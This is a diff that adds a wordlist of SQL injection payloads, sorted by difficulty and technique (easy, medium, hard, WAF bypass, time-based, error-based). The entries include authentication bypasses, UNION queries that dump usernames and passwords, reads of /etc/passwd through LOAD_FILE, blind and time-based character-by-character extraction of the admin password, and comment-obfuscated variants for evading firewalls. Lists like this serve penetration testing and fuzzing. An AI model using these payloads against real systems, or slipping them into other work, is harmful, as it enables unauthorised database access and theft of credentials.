@@ -1,0 +1,171 @@
+# wordlists/payloads/sqli.txt
+# ==================================================
+# SQL INJECTION PAYLOADS - NIVEL EASY
+# ==================================================
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'# 
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION SELECT version()--
+' UNION SELECT current_user--
+' UNION SELECT current_user()--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT name FROM sys.databases--
+' UNION SELECT name FROM sys.sql_logins--
+' UNION SELECT password FROM users--
+' UNION SELECT username,password FROM users--
+' UNION SELECT NULL,table_name FROM information_schema.tables--
+' UNION SELECT NULL,column_name FROM information_schema.columns--
+' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--
+' UNION SELECT NULL,@@version,@@hostname--
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND LENGTH(password)>0)--
+' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')>0--
+' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>0--
+' OR (SELECT password FROM users WHERE username='admin')='admin'--
+' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+
+# ==================================================
+# SQL INJECTION PAYLOADS - NIVEL MEDIUM
+# ==================================================
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1--
+' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1--
+' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0)--
+' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0)--
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97) THEN SLEEP(5) ELSE 0 END)--
+' OR (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97) THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN SLEEP(5) ELSE 0 END)--
+' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN BENCHMARK(5000000,MD5(1)) ELSE 0 END)--
+' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN BENCHMARK(5000000,MD5(1)) ELSE 0 END)--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN pg_sleep(5) ELSE 0 END)--
+' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN pg_sleep(5) ELSE 0 END)--
+
+# ==================================================
+# SQL INJECTION PAYLOADS - NIVEL HARD
+# ==================================================
+' UNION SELECT NULL,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3a)+FROM+information_schema.tables+WHERE+table_schema=database())--
+' UNION SELECT NULL,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3a)+FROM+information_schema.columns+WHERE+table_name=0x7573657273)--
+' UNION SELECT NULL,(SELECT+GROUP_CONCAT(username,0x3a,password+SEPARATOR+0x0a)+FROM+users)--
+' UNION SELECT NULL,LOAD_FILE(0x2f6574632f706173737764)--
+' UNION SELECT NULL,@@version,@@datadir--
+' UNION SELECT NULL,user(),database(),version()--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,username,password FROM users--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users WHERE username='admin'--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 0,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 1,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 2,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 3,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 4,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 5,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 6,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 7,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 8,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 9,1--
+' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users LIMIT 10,1--
+
+# ==================================================
+# SQL INJECTION PAYLOADS - BYPASS WAF
+# ==================================================
+'/**/OR/**/1=1--
+'/*!50000OR*/1=1--
+'/*!50000OR*//**/1=1--
+'/*!50000OR*//*!500001=1*/--
+'/*!50000OR*//*!500001=1*/# 
+'/*!50000OR*//*!500001=1*/--
+'/*!50000OR*/'1'='1'--
+'/*!50000OR*/'1'='1'/*
+'/*!50000OR*/'1'='1'# 
+'/*!50000OR*//**/'1'='1'--
+'/*!50000OR*//**/'1'='1'/*
+'/*!50000OR*//**/'1'='1'# 
+'/*!50000OR*//*!50000'1'='1'*/--
+'/*!50000OR*//*!50000'1'='1'*//*
+'/*!50000OR*//*!50000'1'='1'*/# 
+'/*!50000OR*/1=1/*&#x2a;/
+'/*!50000OR*/1=1/*&#x2a;/# 
+'/*!50000OR*/1=1/*&#x2a;/--
+'/*!50000OR*/'1'='1'/*&#x2a;/
+'/*!50000OR*/'1'='1'/*&#x2a;/# 
+'/*!50000OR*/'1'='1'/*&#x2a;/--
+'/**/UNION/**/SELECT/**/NULL--
+'/**/UNION/**/SELECT/**/NULL,NULL--
+'/**/UNION/**/SELECT/**/NULL,NULL,NULL--
+'/**/UNION/**/SELECT/**/1--
+'/**/UNION/**/SELECT/**/1,2--
+'/**/UNION/**/SELECT/**/1,2,3--
+'/**/UNION/**/SELECT/**/@@version--
+'/**/UNION/**/SELECT/**/user()--
+'/**/UNION/**/SELECT/**/database()--
+'/**/UNION/**/SELECT/**/version()--
+'/**/UNION/**/SELECT/**/current_user--
+'/**/UNION/**/SELECT/**/current_user()--
+'/**/UNION/**/SELECT/**/schema_name/**/FROM/**/information_schema.schemata--
+'/**/UNION/**/SELECT/**/table_name/**/FROM/**/information_schema.tables--
+'/**/UNION/**/SELECT/**/column_name/**/FROM/**/information_schema.columns--
+'/**/UNION/**/SELECT/**/name/**/FROM/**/sys.databases--
+'/**/UNION/**/SELECT/**/name/**/FROM/**/sys.sql_logins--
+'/**/UNION/**/SELECT/**/password/**/FROM/**/users--
+'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--
+'/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--
+'/**/UNION/**/SELECT/**/NULL,column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'--
+'/**/UNION/**/SELECT/**/NULL,username,password/**/FROM/**/users--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/WHERE/**/username='admin'--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/0,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/1,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/2,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/3,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/4,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/5,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/6,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/7,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/8,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/9,1--
+'/**/UNION/**/SELECT/**/NULL,CONCAT(username,0x3a,password),NULL/**/FROM/**/users/**/LIMIT/**/10,1--
+
+# ==================================================
+# SQL INJECTION PAYLOADS - TIME-BASED
+# ==================================================
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1; WAITFOR DELAY '0:0:5'--
+' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1; WAITFOR DELAY '0:0:5'--
+' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0)--
+' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0)--
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97) THEN SLEEP(5) ELSE 0 END)--
+' OR (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97) THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN SLEEP(5) ELSE 0 END)--
+' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN BENCHMARK(5000000,MD5(1)) ELSE 0 END)--
+' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN BENCHMARK(5000000,MD5(1)) ELSE 0 END)--
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN pg_sleep(5) ELSE 0 END)--
+' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)=1 THEN pg_sleep(5) ELSE 0 END)--
+
+# ==================================================
+# SQL INJECTION PAYLOADS - ERROR-BASED
+# ==================================================
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin' LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
